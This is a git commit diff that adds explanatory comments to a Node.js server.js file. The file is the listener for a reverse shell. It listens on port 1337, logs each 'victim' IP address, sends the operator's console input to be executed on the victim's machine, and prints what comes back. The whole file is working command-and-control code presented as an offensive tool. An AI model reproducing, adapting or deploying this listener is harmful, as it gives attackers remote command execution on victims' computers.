c2c87d7dcb33b851a147c4f7f8a7eafc90b544a2
Aegis <32366759+z3r0Sec@users.noreply.github.com>
2018-09-09 01:49:59 +0200

    Update server.js

--- server.js
+++ server.js
@@ -2,17 +2,23 @@ var net = require('net');
 var stdin = process.openStdin();
 
 var server = net.createServer(function(connection) { 
+   //log victims ip and port they used to connect to our shell
    console.log('client connected # ', connection.remoteAddress + ':' + connection.remotePort);
    connection.on('end', function() {
+      //Check if the client disconnected
       console.log('client disconnected');
    });
-   stdin.addListener("data", function(d) { 	
+   //listen for console input
+   stdin.addListener("data", function(d) {
+   //send console input as the command which will be executed on the clients side
    connection.write(d.toString());
    });
+   //log the data which has been send back by the victim (client)
    connection.on('data', function(d){
    console.log(d.toString())
    });
 });
+//server listening on port 1337
 server.listen(1337, function() { 
    console.log('server is listening');
 });
